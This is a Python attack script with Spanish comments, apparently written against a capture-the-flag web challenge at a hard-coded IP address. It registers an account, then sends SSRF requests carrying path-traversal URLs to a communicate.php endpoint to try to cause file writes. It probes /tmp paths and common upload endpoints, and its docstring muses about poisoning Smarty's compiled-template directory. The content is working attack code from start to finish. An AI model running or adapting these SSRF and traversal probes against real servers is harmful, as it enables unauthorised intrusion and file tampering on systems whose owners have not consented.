#!/usr/bin/env python3
"""
¿Puedo escribir archivos de alguna forma?

Smarty compila templates a PHP en templates_c/

¿Hay alguna forma de contaminar ese directorio?
"""
import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

data = {'name': 'user1', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# Probar si puedo escribir via el SSRF aunque no llegue a localhost
# Quizás el servidor escribe logs o cache basado en la URL

print("[*] Intentando causar side-effects con SSRF...")

# URLs que podrían causar escrituras de archivos
test_urls_side_effects = [
    ("http://motherland.com/../../../tmp/test.txt", "Path traversal"),
    ("http://motherland.com/index.php", "Path con archivo"),
    ("http://motherland.com/?file=../../tmp/test", "Query string"),
]

for url, desc in test_urls_side_effects:
    print(f"[*] {desc}: {url}")
    data_req = {
        'url': url,
        'data[test]': 'value'
    }
    
    try:
        resp = session.post(f"{TARGET}/communicate.php", data=data_req, timeout=10)
        print(f"    Enviado")
    except:
        pass

# Probar si puedo acceder a archivos escritos
print("\n[*] Intentando acceder a posibles archivos escritos...")
test_paths = [
    "/tmp/test.txt",
    "/tmp/test",
    "/var/tmp/test.txt",
]

for path in test_paths:
    resp = session.get(f"{TARGET}{path}")
    if resp.status_code != 404:
        print(f"    [{resp.status_code}] {path}")

# Probar si hay algún endpoint de upload
print("\n[*] Buscando endpoints de upload...")
upload_endpoints = [
    "/upload.php",
    "/upload",
    "/file_upload.php",
    "/uploader.php",
]

for endpoint in upload_endpoints:
    resp = session.get(f"{TARGET}{endpoint}")
    if resp.status_code != 404:
        print(f"    [{resp.status_code}] {endpoint}")
